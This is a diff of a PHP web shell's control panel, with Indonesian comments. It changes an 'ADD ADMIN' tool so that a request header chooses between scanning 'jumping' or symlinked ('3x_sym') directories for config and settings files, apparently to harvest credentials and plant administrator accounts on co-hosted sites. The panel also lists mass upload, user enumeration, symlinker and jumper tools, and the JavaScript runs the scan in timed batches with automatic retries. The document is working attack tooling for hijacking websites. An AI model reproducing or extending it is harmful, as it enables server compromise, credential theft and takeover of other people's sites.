@@ -251,7 +251,12 @@ if (isset($_SERVER[$h_act])) {
         if ($tool === 'add_admin') {
             $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
             $limit = 5; 
-            $scan_path = is_dir($target . '/jumping') ? $target . '/jumping' : $target;
+            // MODIFIKASI: Deteksi mode dari header (symlink/jumping)
+            $mode = isset($_SERVER['HTTP_X_MODE']) ? $_SERVER['HTTP_X_MODE'] : 'jumping';
+            $target_sub = ($mode === 'symlink') ? '3x_sym' : 'jumping';
+            
+            // Set path berdasarkan pilihan
+            $scan_path = is_dir($target . '/' . $target_sub) ? $target . '/' . $target_sub : $target;
             $all_files = scandir($scan_path);
             $config_files = [];
             foreach($all_files as $f) { if($f == '.' || $f == '..') continue; if(stripos($f, 'config') !== false || stripos($f, 'settings') !== false) $config_files[] = $scan_path . '/' . $f; }
@@ -599,7 +604,7 @@ if (isset($_SERVER[$h_act])) {
                     <div class="tool-cmd" onclick="showMassUpload()"><div class="cmd-left"><i class="fas fa-rocket cmd-icon c-purple"></i><span class="cmd-text">SMART MASS UPLOAD</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                     
                     <div class="tool-cmd" onclick="runTool('bypass_user')"><div class="cmd-left"><i class="fas fa-users-slash cmd-icon c-cyan"></i><span class="cmd-text">USER ENUM</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
-                    <div class="tool-cmd" onclick="runWatchdogTool('add_admin', 0)"><div class="cmd-left"><i class="fas fa-user-plus cmd-icon c-lime"></i><span class="cmd-text">ADD ADMIN (BATCH)</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
+                    <div class="tool-cmd" onclick="startAddAdmin()"><div class="cmd-left"><i class="fas fa-user-plus cmd-icon c-lime"></i><span class="cmd-text">ADD ADMIN </span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                     <div class="tool-cmd" onclick="runTool('symlink_cage')"><div class="cmd-left"><i class="fas fa-project-diagram cmd-icon c-gold"></i><span class="cmd-text">SYMLINKER</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                     <div class="tool-cmd" onclick="runTool('jumper_cage')"><div class="cmd-left"><i class="fas fa-box-open cmd-icon c-rose"></i><span class="cmd-text">JUMPER</span></div><i class="fas fa-arrow-right cmd-arrow"></i></div>
                 </div>
@@ -895,10 +900,50 @@ if (isset($_SERVER[$h_act])) {
     function toggleWidget() { let b = document.getElementById('aw-content'); b.style.display = (b.style.display === 'none') ? 'block' : 'none'; }
     
     function runTool(toolName) { showLog(); let log = document.getElementById('global-log'); log.innerHTML += `<div class="text-primary mb-2"><i class="fas fa-cog fa-spin me-2"></i>Running ${toolName}...</div>`; api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div class="text-success mt-2"><i class="fas fa-check me-2"></i>Done.</div><hr class="border-secondary">`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div class="text-danger">Error: ${e}</div>`; }); }
-    function runWatchdogTool(toolName, step) {
-        let log = document.getElementById('global-log'); if(step === 0) { showLog(); log.innerHTML = `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (Fast Mode)...</div><hr class="border-secondary">`; }
-        const controller = new AbortController(); const timeoutId = setTimeout(() => { controller.abort(); log.innerHTML += `<div class="text-warning">[!] Watchdog: Batch Timeout (20s) at #${step}. Skipping 5...</div>`; log.scrollTop = log.scrollHeight; runWatchdogTool(toolName, step+5); }, 20000);
-        api('tool', currentPath, 'GET', {'X-Tool': toolName, 'X-Step': step}, null, controller.signal).then(r => r.json()).then(res => { clearTimeout(timeoutId); if(res.html) log.innerHTML += res.html; if(res.status === 'continue') { log.scrollTop = log.scrollHeight; setTimeout(() => runWatchdogTool(toolName, res.next_step), 10); } else { log.innerHTML += `<hr class="border-secondary"><div class="text-success fw-bold"><i class="fas fa-flag-checkered me-2"></i>JOB FINISHED. Scanned ${res.total} files.</div>`; log.scrollTop = log.scrollHeight; } }).catch(err => { if(err.name === 'AbortError') return; log.innerHTML += `<div class="text-danger">[!] Net Err at #${step}. Skipping batch...</div>`; runWatchdogTool(toolName, step+5); });
+    // MODIFIKASI: Fungsi baru untuk memilih mode
+    function startAddAdmin() {
+        let choice = prompt("Pilih Target Scan:\n1 = Jumping (Default)\n2 = Symlink (3x_sym)");
+        let mode = (choice === '2') ? 'symlink' : 'jumping';
+        runWatchdogTool('add_admin', 0, mode);
+    }
+
+    // MODIFIKASI: Tambahkan parameter 'mode' dan kirim Header X-Mode
+    function runWatchdogTool(toolName, step, mode = 'jumping') {
+        let log = document.getElementById('global-log'); 
+        if(step === 0) { 
+            showLog(); 
+            log.innerHTML = `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (${mode.toUpperCase()})...</div><hr class="border-secondary">`; 
+        }
+        
+        const controller = new AbortController(); 
+        // Pass 'mode' ke timeout rekursif
+        const timeoutId = setTimeout(() => { 
+            controller.abort(); 
+            log.innerHTML += `<div class="text-warning">[!] Watchdog: Batch Timeout (20s) at #${step}. Skipping 5...</div>`; 
+            log.scrollTop = log.scrollHeight; 
+            runWatchdogTool(toolName, step+5, mode); 
+        }, 20000);
+
+        // Kirim X-Mode di header
+        api('tool', currentPath, 'GET', {'X-Tool': toolName, 'X-Step': step, 'X-Mode': mode}, null, controller.signal)
+        .then(r => r.json())
+        .then(res => { 
+            clearTimeout(timeoutId); 
+            if(res.html) log.innerHTML += res.html; 
+            if(res.status === 'continue') { 
+                log.scrollTop = log.scrollHeight; 
+                // Pass 'mode' ke next step
+                setTimeout(() => runWatchdogTool(toolName, res.next_step, mode), 10); 
+            } else { 
+                log.innerHTML += `<hr class="border-secondary"><div class="text-success fw-bold"><i class="fas fa-flag-checkered me-2"></i>JOB FINISHED. Scanned ${res.total} files.</div>`; 
+                log.scrollTop = log.scrollHeight; 
+            } 
+        }).catch(err => { 
+            if(err.name === 'AbortError') return; 
+            log.innerHTML += `<div class="text-danger">[!] Net Err at #${step}. Skipping batch...</div>`; 
+            // Pass 'mode' saat error retry
+            runWatchdogTool(toolName, step+5, mode); 
+        });
     }
     
     loadDir('');
